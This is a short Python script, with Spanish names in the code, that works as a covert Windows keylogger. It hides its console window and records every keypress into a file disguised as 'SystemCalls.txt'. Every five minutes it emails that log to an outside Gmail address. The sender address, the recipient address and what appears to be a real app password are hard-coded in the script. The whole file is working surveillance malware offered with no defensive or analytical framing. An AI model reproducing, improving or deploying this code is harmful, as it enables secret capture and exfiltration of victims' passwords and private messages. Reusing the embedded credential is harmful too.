import keyboard
import win32api 
import win32console 
import win32gui
from email.message import EmailMessage
import ssl
import smtplib
import mimetypes
import threading
import time


win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

def on_key_event(e):  
    if e.event_type == keyboard.KEY_DOWN:
        key = e.name
        with open('SystemCalls.txt', 'a') as f:
            #salto = '\n'
            f.write(key + " ")

def attach_file(message, filepath):
    content_type, encoding = mimetypes.guess_type(filepath)
    if content_type is None or encoding is not None:
        content_type = 'application/octet-stream'
    
    main_type, sub_type = content_type.split('/', 1)
    with open(filepath, 'rb') as fp:
        message.add_attachment(fp.read(), maintype=main_type, subtype=sub_type, filename=filepath)

def enviar_email():
    emailEnvia = "destripador.30001@gmail.com"
    password = "mulv ijdb zbgd dffv"
    correo = "juanesvalon02@gmail.com"
    titulo = "Registro de teclas"
    body = "Archivo con teclas pulsadas"

    em = EmailMessage()
    em['From'] = emailEnvia
    em['To'] = correo
    em['Subject'] = titulo
    em.set_content(body)
    
    attach_file(em, 'SystemCalls.txt')

    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(emailEnvia, password)
            smtp.send_message(em)
        
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

def conexion():
    while True:
        time.sleep(300)  
        enviar_email()

hilo_teclado = threading.Thread(target=lambda: keyboard.hook(on_key_event))
hilo_espera = threading.Thread(target=lambda: keyboard.wait())  
hilo_conexion = threading.Thread(target=conexion)

hilo_teclado.start()
hilo_espera.start()
hilo_conexion.start()


hilo_espera.join()
hilo_teclado.join()
hilo_conexion.join()

